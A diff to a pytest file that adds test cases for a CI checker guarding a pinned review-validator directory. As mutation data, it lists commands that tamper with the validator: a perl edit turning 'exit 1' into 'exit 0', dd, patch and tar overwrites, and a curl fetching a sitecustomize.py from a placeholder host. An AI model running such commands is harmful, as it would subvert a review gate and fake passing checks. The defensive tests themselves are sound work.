@@ -775,6 +775,58 @@ MUTATIONS = [
         "no_run_writes",
         id="run-sed-in-place",
     ),
+    # (b) rework 3: spellings no denylist names; the allowlist must fail them closed
+    pytest.param(
+        _before_run(
+            "perl -0777 -pi -e 's/exit 1/exit 0/' .review-gate-tools/scripts/validate_review.py"
+        ),
+        "no_run_writes",
+        id="run-perl-in-place",
+    ),
+    pytest.param(
+        _before_run("dd if=/tmp/v.py of=.review-gate-tools/scripts/validate_review.py"),
+        "no_run_writes",
+        id="run-dd-of",
+    ),
+    pytest.param(
+        _before_run("patch -d .review-gate-tools -p1 < /tmp/judge.patch"),
+        "no_run_writes",
+        id="run-patch-d",
+    ),
+    pytest.param(
+        _before_run(
+            "curl -sSfL -o.review-gate-tools/scripts/sitecustomize.py https://example.invalid/s.py"
+        ),
+        "no_run_writes",
+        id="run-curl-attached-o",
+    ),
+    pytest.param(
+        _before_run("tar -xzf /tmp/judge.tgz -C.review-gate-tools"),
+        "no_run_writes",
+        id="run-tar-attached-c",
+    ),
+    pytest.param(
+        _before_run(
+            "ls .review-gate-tools && perl -0777 -pi -e '' .review-gate-tools/scripts/x.py"
+        ),
+        "no_run_writes",
+        id="run-read-chained-with-write",
+    ),
+    pytest.param(
+        _before_run("echo \"$(perl -pi -e '' .review-gate-tools/scripts/x.py)\""),
+        "no_run_writes",
+        id="run-read-with-substitution",
+    ),
+    pytest.param(
+        _before_run("python3 .review-gate-tools/scripts/validate_review.py > /tmp/out.txt"),
+        "no_run_writes",
+        id="run-allowlisted-invocation-redirected",
+    ),
+    pytest.param(
+        _before_run("python3 -c \"open('.review-gate-tools/scripts/x.py', 'w')\""),
+        "no_run_writes",
+        id="run-python-c-write",
+    ),
     # (c) order: nothing between the pinned checkout and the validator run touches the judge
     pytest.param(
         _step_before(
@@ -848,6 +900,15 @@ EQUIVALENT_EDITS = [
     pytest.param(
         _step_before(_SETUP, "      - name: Show tools\n        run: ls -R .review-gate-tools\n\n"),
         id="between-step-read-only",
+    ),
+    pytest.param(
+        _before_run("cat .review-gate-tools/scripts/validate_review.py"),
+        id="validator-step-cat-read",
+    ),
+    pytest.param(_before_run("ls -la .review-gate-tools/scripts"), id="validator-step-ls-read"),
+    pytest.param(
+        _before_run('echo "judge: .review-gate-tools/scripts/validate_review.py"'),
+        id="validator-step-echo-mention",
     ),
 ]
 
